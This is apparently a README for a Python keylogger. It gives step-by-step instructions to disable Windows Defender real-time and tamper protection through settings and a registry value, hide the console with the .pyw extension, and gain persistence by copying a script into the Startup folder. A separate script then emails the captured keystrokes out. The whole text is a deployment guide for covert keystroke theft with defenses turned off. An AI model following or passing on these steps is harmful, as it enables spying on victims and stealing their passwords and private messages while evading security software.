'.pyw' extention is to not open the cmd command prompt


step 1:- disable realtime protection
         go to windows security and turn off real-time protection and tamper protection
         Then go to registry->local machine->software->policies->microsoft->windows defender
         Then create a new key by right clicking on windows defender folder and name it 'Real-Time Protection'
         Then create a new DWORD(32-bit) file named 'DisableRealtimeProtection' and modify its value to 1.


step 1:- download & paste the folder in C: directory


step 2:- install python from pyhton.org before installation check both boxes and make sure that in customized installation
         all options except last two are checked.


step 3:- for 'python-keylogger.pyw' to execute we need to install 'pynput' from cmd (internet required)
         type this(in cmd):  "pip install pynput"
         this file creates a 'keylogs.txt' file in which all key strokes are stored


for 'send_email.pyw' file to work 'keylogs.txt' file should be in the same directory
(change the email credentials for convenience)


step 4:- press win+r and open this directory
         %AppData%\Microsoft\Windows\Start Menu\Programs
         copy & paste 'keylogger_startup.pyw' in Startup folder
         if the folder doesn't exist then make one
         
step 5:- execute 'python-keylogger.pyw' then 'send_email.pyw'